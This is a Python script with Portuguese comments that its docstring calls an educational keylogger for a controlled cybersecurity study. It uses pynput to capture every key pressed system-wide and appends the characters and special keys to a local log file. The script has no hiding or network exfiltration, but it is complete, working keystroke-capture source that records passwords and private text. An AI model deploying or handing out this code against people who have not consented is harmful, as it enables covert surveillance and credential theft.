"""
Keylogger Simulado para Fins Educacionais
Captura de teclas e armazenamento em arquivo .txt
Projeto de Cibersegurança - Ambiente Controlado de Estudo
"""

from pynput import keyboard
import os
from datetime import datetime

# Configurações
LOG_FILE = "Keylogger/log.txt"
KEYS_CAPTURED = []

# Teclas a ignorar (modificadores e especiais)
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
}


def registrar_tecla(tecla_pressionada):
    """
    Função chamada quando uma tecla é pressionada.
    Registra a tecla no arquivo de log.
    """
    global KEYS_CAPTURED
    
    try:
        # Se for uma tecla normal (letra, número, símbolo)
        if isinstance(tecla_pressionada, keyboard.KeyCode):
            char = tecla_pressionada.char
            if char:
                KEYS_CAPTURED.append(char)
                # Registra no arquivo
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(char)
        
        # Se for uma tecla especial
        elif tecla_pressionada in IGNORAR:
            pass  # Ignora teclas modificadoras
        
        else:
            # Teclas especiais como Enter, Tab, Backspace, etc.
            if tecla_pressionada == keyboard.Key.space:
                KEYS_CAPTURED.append(" ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(" ")
            
            elif tecla_pressionada == keyboard.Key.enter:
                KEYS_CAPTURED.append("\n")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write("\n")
            
            elif tecla_pressionada == keyboard.Key.tab:
                KEYS_CAPTURED.append("\t")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write("\t")
            
            elif tecla_pressionada == keyboard.Key.backspace:
                KEYS_CAPTURED.append(" [BACKSPACE] ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(" [BACKSPACE] ")
            
            elif tecla_pressionada == keyboard.Key.esc:
                KEYS_CAPTURED.append(" [ESC] ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(" [ESC] ")
            
            else:
                # Outras teclas especiais
                KEYS_CAPTURED.append(f" [{str(tecla_pressionada)}] ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(f" [{str(tecla_pressionada)}] ")
    
    except AttributeError:
        pass


def iniciar_captura():
    """
    Inicia o listener de teclado para capturar as teclas pressionadas.
    """
    print("[*] Keylogger iniciado...")
    print(f"[*] Registrando teclas em: {LOG_FILE}")
    print("[*] Pressione Ctrl+C para parar\n")
    
    # Cria o listener de teclado
    with keyboard.Listener(on_press=registrar_tecla) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\n[!] Keylogger parado pelo usuário")
            parar_captura()


def parar_captura():
    """
    Para a captura de teclas e exibe um resumo.
    """
    print(f"\n[*] Total de teclas capturadas: {len(KEYS_CAPTURED)}")
    print(f"[*] Arquivo de log salvo em: {LOG_FILE}")
    print("[*] Finalizando...")


if __name__ == "__main__":
    # Cria o arquivo de log com timestamp
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write(f"=== KEYLOGGER - Iniciado em {datetime.now()} ===\n")
    
    # Inicia a captura
    iniciar_captura()

